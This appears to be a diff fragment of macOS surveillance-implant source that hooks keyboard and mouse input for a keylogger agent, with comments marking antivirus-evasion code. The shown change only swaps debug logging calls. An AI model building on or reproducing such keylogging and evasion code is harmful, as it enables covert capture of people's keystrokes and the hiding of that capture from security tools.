@@ -1229,7 +1229,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       if (mouseFlag == 0 || mouseAgentIsActive == 0)
       {
 #ifdef DEBUG_INPUT_MANAGER
-        infoLog(@"Hooking keyboard");
+        NSLog(@"Hooking keyboard");
 #endif
         
         // AV evasion: only on release build
@@ -1333,7 +1333,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       if (keyboardFlag == 0 || keylogAgentIsActive == 0)
       {
 #ifdef DEBUG_INPUT_MANAGER
-        infoLog(@"Hooking mouse");
+        NSLog(@"Hooking mouse");
 #endif
         
         // AV evasion: only on release build
